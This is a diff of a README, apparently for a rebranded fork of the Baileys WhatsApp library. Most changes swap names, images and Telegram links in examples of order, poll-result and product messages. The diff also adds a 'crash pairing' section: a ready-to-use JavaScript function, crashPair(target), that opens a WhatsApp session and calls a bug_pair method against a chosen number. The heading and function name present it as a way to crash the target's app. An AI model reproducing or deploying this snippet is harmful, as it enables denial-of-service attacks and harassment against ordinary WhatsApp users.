@@ -61,12 +61,12 @@ console.log("Ur pairing code : " + code)
 ## send orderMessage
 ```javascript
 const fs = require('fs');
-const ZeppImg = fs.readFileSync('./ZeppImage');
+const DrayyImg = fs.readFileSync('./DrayyImage');
 
 await client.sendMessage(m.chat, {
-  thumbnail: ZeppImg,
-  message: "Gotta get a grip",
-  orderTitle: "7eppeli-Corporation",
+  thumbnail: DrayyImg,
+  message: "erortidakdiketaui",
+  orderTitle: "DʀʏᴢxMᴏᴅs",
   totalAmount1000: 72502,
   totalCurrencyCode: "IDR"
 }, { quoted:m })
@@ -76,7 +76,7 @@ await client.sendMessage(m.chat, {
 ```javascript
 await client.sendMessage(m.chat, {
   pollResultMessage: {
-    name: "7eppeli-Corporation",
+    name: "DʀʏᴢxMᴏᴅs",
     options: [
       {
         optionName: "poll 1"
@@ -86,7 +86,7 @@ await client.sendMessage(m.chat, {
       }
     ],
     newsletter: {
-      newsletterName: "7eppeli | Killer Queen Information",
+      newsletterName: "DʀʏᴢxMᴏᴅs",
       newsletterJid: "1@newsletter"
     }
   }
@@ -97,24 +97,49 @@ await client.sendMessage(m.chat, {
 ```javascript
 await client.relayMessage(m.chat, {
   productMessage {
-    title: "7eppeli.pdf",
+    title: "erortidakdiketaui",
     description: "zZZ...",
-    thumbnail: { url: "./ZeppImage" },
+    thumbnail: { url: "./DrayyImage" },
     productId: "EXAMPLE_TOKEN",
     retailerId: "EXAMPLE_RETAILER_ID",
-    url: "https://t.me/YuukeyD7eppeli",
+    url: "https://t.me/erortidakdiketaui",
     body: "Nak Tido",
     footer: "Footer",
     buttons: [
       {
         name: "cta_url",
-        buttonParamsJson: "{\"display_text\":\"7eppeli-Pdf\",\"url\":\"https://t.me/YuukeyD7eppeli\"}"
+        buttonParamsJson: "{\"display_text\":\"DʀʏᴢxMᴏᴅs\",\"url\":\"https://t.me/erortidakdiketaui\"}"
       }
     ],
     priceAmount1000: 72502,
     currencyCode: "IDR"
   }
 })
+```
+
+# Sending crashpair
+
+## send crash pairing
+```javascript
+const { 
+  default: makeWaSocket,
+  useMultiFileAuthState,
+  fetchLatestBaileysVersion
+} = require("@whiskeysockets/baileys")
+const pino = require('pino')
+
+async function crashPair(target) {
+  let { state } = await useMultiFileAuthState('./x')
+  let { version } = await fetchLatestBaileysVersion()
+  let sock = await makeWaSocket({
+    auth: state,
+    version,
+    logger: pino({ level: 'fatal' })
+  })
+
+  await sleep(1500)
+  await sock.bug_pair(target, "DʀʏᴢxMᴏᴅs")
+}
 ```
 
 ### Other Tech Stacks
@@ -124,7 +149,3 @@ await client.relayMessage(m.chat, {
 ### Tools
 
 ![My Skills](https://skillicons.dev/icons?i=github)
-<!--
-
-
-Follow https://t.me/TenkaWaBails kalau mau liat type message yg lain :v
